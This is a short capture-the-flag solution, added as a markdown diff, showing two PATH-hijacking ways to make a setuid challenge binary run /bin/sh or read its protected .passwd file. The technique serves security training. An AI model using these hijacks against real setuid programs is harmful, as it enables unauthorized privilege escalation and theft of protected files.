@@ -1,0 +1,27 @@
+## symbol link
+
+```shell
+cd /tmp
+mkdir Icemakr
+cd Icemakr
+ln -s /bin/sh ls
+unalias ls
+export PATH="/tmp/Icemakr"
+/challenge/app-script/ch11/ch11
+```
+
+## script
+
+```shell
+cd /tmp
+mkdir Icemakr
+cd Icemakr
+cat > ls
+#!/bin/sh
+/bin/cat /challenge/app-script/ch11/.passwd
+```
+
+chmod +x ./ls
+export PATH="/tmp/Icemakr"
+/challenge/app-script/ch11/ch11
+```
